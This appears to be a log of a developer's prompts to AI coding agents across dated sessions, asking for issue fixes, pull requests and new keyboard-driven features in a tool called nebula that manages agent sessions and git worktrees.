> fix https://github.com/AgentSystemLabs/nebula/issues/46 in a worktree, make a pr when done

### Session 413

> address https://github.com/AgentSystemLabs/nebula/issues/47 in a worktree and make pr

### Session 414

> address https://github.com/AgentSystemLabs/nebula/issues/48 in a worktree and make a pr

### Session 415

> address https://github.com/AgentSystemLabs/nebula/issues/49 in a worktree and make a pr

### Session 416

> address https://github.com/AgentSystemLabs/nebula/issues/51 and yes, keep the focus enabled by default, but allow a user to disable it

<details><summary>1 follow-up prompt</summary>

- update, do this work inside a worktree

</details>

### Session 417

> address https://github.com/AgentSystemLabs/nebula/issues/52 in a worktree and make a pr (first investigate if this is a real issue or not)

### Session 418

> address https://github.com/AgentSystemLabs/nebula/issues/53 in a worktree then make a pr

### Session 419

> add an issues modal which will list all githubb issues on left navigation list, latest at the top, allow user to navigate through them. on the right panel, we should be able to read the issue info.  also allow a user to create a prompt directly off that issue. it should post the issue url as system context so the hsarness is aware what issue we are trying to fix.  we should also be able to run presets agents on it as well

<details><summary>1 follow-up prompt</summary>

- make a pr for these changes

</details>

### Session 420

> work through every pr (that isn't a draft), and verify it passes, merge if it does, then move onto the next. start with the oldest pull requests first. do not ever merge a draft pr, continue until all merged and passing


## Sun, Sep 13, 2026

### Session 421

> half page up and down doesn't seem to work on the session list... is it supposed to?

<details><summary>1 follow-up prompt</summary>

- do the same for the session panel as we could have a lot of archived sessions

</details>

### Session 422

> when a user presses n on the sessions list to create a new session (after they select the harness), the moda that shows is a name agent modal.  Instead, stop showing that modal and just go straight to showing the prompt modal so a user can start typing their prompt instead of having to first open the session and type directly into claude code, etc

### Session 423

> when creating a claude cloud sessions, instead of trying to connect to the claude session using teleport, just show an information panel that has the link clickable to the running cloud agent

### Session 424

> add in an experimental option which turns on a key combo display in the bottom left of the screen. as a user presses certain keys, it should show so that other people watching can learn my short cuts. try to follow how i think vim or neovim has that option. make sure as I type the combo, if it activated a real command, then display THAT command with the keyboard shortcut to the left so it's the format of SHORTCUT COMBO - &lt;what it does>.

<details><summary>1 follow-up prompt</summary>

- continue

</details>

### Session 425

> fix the conflicts then push

### Session 426

> find what commit I had all my prompt history in a directory and open it in a browser

<details><summary>1 follow-up prompt</summary>

- no I mean I used to have a skill which wrote down every single prompt I made into an agent and a recall skill used to read over it I think

</details>

### Session 427

> do some work, etc

### Session 428

> determine how many lines of rust code this project has do not include any third party in teh count

### Session 429

> fix the bug that does X

<details><summary>1 follow-up prompt</summary>

- make a pr when done

</details>


## Mon, Sep 14, 2026

### Session 430

> I noticed when I tried to create a new work tree, when I had the work tree panel selected and I pressed in, it took about five seconds for that work tree to even show up in the list for me. Can you optimize that and do some type of client-side optimization so that it shows much faster instead of feeling very sluggish?

### Session 431

> when I am at the LAST session in the session list and I archive, it should pick the next session ABOVE.  right now it picks the terminal below.  but keep in mind if I'm at the start or at the top of the session list, as I archive it should move down

<details><summary>1 follow-up prompt</summary>

- continue

</details>

### Session 432

> when trying to run an agent present, make the prompt optional. for example, I have a preset called commit and push which I shouldn't need to actually prompt anything else.  in fact, allow a user to toggle a preset to not even require a prompt at all so that when I run the present it just runs without asking me for a prompt.

### Session 433

> read comments as well then fix, do 2 rounds of review, then make pr

### Session 434

> add a branch selector option so when a user is focused on root, they can press a hotkey to show a branch + filter panel so they can switch root's branch.  allow a user to type to quick filter to find branches (and remotes). make this fast. if user has changes, prompt with option to stash, commit first, or whatever other option you'd recommend or traditional ides switch branches. do 2 rounds of review. make pr when done

<details><summary>3 follow-up prompts</summary>

- /btw are you doing this work in a separtae worktree?
- i think you needed to do this in a brand new worktree
- fix conflicts on pr and merge pr

</details>

### Session 435

> think of a way to achieve this. i think another github issue is asking for a similar feature so go online to check. we need to make sure we can easily support forwarding configurations when we ssh into a remote machine to almost sync the config so we don't need to keep reconfiguring. keep in mind a remote machine may have a separate set of project, or version of nebula, so we need to make versions backwards compatible as we add new configs we don't break the existing system. it should be easy also for someone to just back up config json somewhere and restore into a directory to automatically update the settings

<details><summary>1 follow-up prompt</summary>

- build it

</details>

### Session 436

> add a way for a user to press r when focused on a worktree to run the project.  pressing r again should stop. track which worktree is running and display an indictator it's obvious it's running. the command you should run can be defined in the project directory as .nebula.json file which should be committed which describes to nebula how this project should be invoked. also add a config for how to "open" and allow a user to for example define open http://localhost:3000 as a comand which when a user presses shift enter on a focused worktree it runs that command

<details><summary>1 follow-up prompt</summary>

- make a pr

</details>

### Session 437

> sometimes when I try to click back on an old worktree to view a session in it, it errors saying could not find the session, but then I clicked away and clicked again and it displayed.  debug what might be wrong with invalid session ids or reloading a claude session

<details><summary>1 follow-up prompt</summary>

- yes implement and do it on this main branch

</details>

### Session 438

> i noticed that claude code asked me a multi choice question but nebula status never turned red, help me debug why and fix

### Session 439

> make sure the status indictator turns gray on the session if it's not warm

### Session 440

> update the screenshot on readme to this /var/folders/yk/56l0_s6978qfh521xf1dtx3r0000gn/T/TemporaryItems/NSIRD_screencaptureui_gBRSVK/Screenshot\ 2026-09-14\ at\ 9.55.48 PM.png

### Session 441

> is it possible to add a hotkey which will create a new tab in ghostty directly to where the worktree is located on the machine?

<details><summary>2 follow-up prompts</summary>

- ok go with 1 but only let the user run it if ghostty is even on the machine, otherwise do nothing for now, silent ignore
- make a pr

</details>

### Session 442

> print
>
> hello world
